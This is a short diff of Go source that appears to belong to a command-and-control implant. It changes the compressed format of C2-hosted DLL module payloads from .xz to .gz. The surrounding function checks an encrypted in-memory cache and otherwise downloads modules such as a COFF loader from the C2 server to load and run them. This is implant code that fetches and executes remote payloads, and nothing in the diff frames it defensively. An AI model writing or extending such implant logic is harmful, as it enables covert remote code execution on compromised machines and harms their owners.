@@ -63,10 +63,10 @@ func runDLLModule(dllData []byte, invocation def.ResolvedInvocation, token uintp
 
 // fetchDependencyDLL returns the raw DLL bytes for a named DLL module
 // dependency (e.g. "coffloader"). It checks the encrypted memfs cache first
-// and falls back to downloading the C2-hosted <name>.<arch>.xz module payload.
+// and falls back to downloading the C2-hosted <name>.<arch>.gz module payload.
 //
 // Module names are canonicalized to lowercase so a dependency spelled
-// "COFFLoader" still resolves to the C2-hosted "coffloader.<arch>.xz".
+// "COFFLoader" still resolves to the C2-hosted "coffloader.<arch>.gz".
 func fetchDependencyDLL(name string) ([]byte, error) {
 	name = strings.ToLower(name)
 	rawKey := "mem:///" + name + ".dll"
@@ -75,7 +75,7 @@ func fetchDependencyDLL(name string) ([]byte, error) {
 		return cached, nil
 	}
 
-	hostedName := fmt.Sprintf("%s.%s.xz", name, runtime.GOARCH)
+	hostedName := fmt.Sprintf("%s.%s.gz", name, runtime.GOARCH)
 	compressed, err := fetchFile(common.RuntimeConfig, "", hostedName, "", "")
 	if err != nil {
 		return nil, fmt.Errorf("fetching %s: %w", hostedName, err)
